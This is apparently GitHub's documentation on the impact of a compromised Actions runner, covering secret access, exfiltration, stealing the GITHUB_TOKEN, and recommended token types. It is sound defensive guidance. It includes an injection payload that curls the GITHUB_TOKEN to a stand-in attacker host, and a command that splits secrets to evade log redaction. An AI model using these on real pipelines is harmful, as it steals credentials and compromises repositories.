# Compromised runners

## Potential impact of a compromised runner

These sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner.



> [!NOTE]
> GitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.



### Accessing secrets

Workflows triggered from a forked repository using the `pull_request` event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as `issue_comment`, `issues`, `push` and `pull_request` from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's [`GITHUB_TOKEN`](/actions/concepts/security/github_token).

* If the secret or token is set to an environment variable, it can be directly accessed through the environment using `printenv`.
* If the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.
* For a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:

  {% raw %}

  ```yaml
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```

  {% endraw %}

Although GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the `GITHUB_TOKEN` and any referenced secrets can be harvested by a determined attacker.

### Exfiltrating data from a runner

An attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions [automatically redact secrets printed to the log](/actions/how-tos/write-workflows/choose-what-workflows-do/use-secrets), but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.

### Stealing the job's `GITHUB_TOKEN`

It is possible for an attacker to steal a job's `GITHUB_TOKEN`. The GitHub Actions runner automatically receives a generated `GITHUB_TOKEN` with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`.

### Modifying the contents of a repository

The attacker server can use the GitHub API to [modify repository content](/actions/reference/workflows-and-actions/workflow-syntax#permissions), including releases, if the assigned permissions of `GITHUB_TOKEN` [are not restricted](/actions/tutorials/authenticate-with-github_token#modifying-the-permissions-for-the-github_token).

### Cross-repository access

GitHub Actions is intentionally scoped for a single repository at a time. The `GITHUB_TOKEN` grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the `GITHUB_TOKEN` if necessary. Users have specific permissions for each repository, so allowing the `GITHUB_TOKEN` for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.

If your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, see [Share With Your Enterprise](https://docs.github.com/en/enterprise-cloud@latest/actions/how-tos/reuse-automations/share-with-your-enterprise).

You can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.

This list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:

1. **The `GITHUB_TOKEN`**
    * This token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see [Authenticate With Github_Token](https://docs.github.com/en/actions/tutorials/authenticate-with-github_token).
    * The `GITHUB_TOKEN` should be used whenever possible.
1. **Repository deploy key**
    * Deploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see [Managing Deploy Keys](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys).
    * Note that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.
1. **GitHub App tokens**
    * GitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see [Making Authenticated API Requests With A GitHub App In A GitHub Actions Workflow](https://docs.github.com/en/apps/creating-github-apps/authenticating-with-a-github-app/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).
1. **personal access tokens**
    * You should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.
    * If you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.
1. **SSH keys on a personal account**
    * Workflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.

## Next steps

For security best practices with GitHub Actions, see [Secure Use](https://docs.github.com/en/actions/reference/security/secure-use).
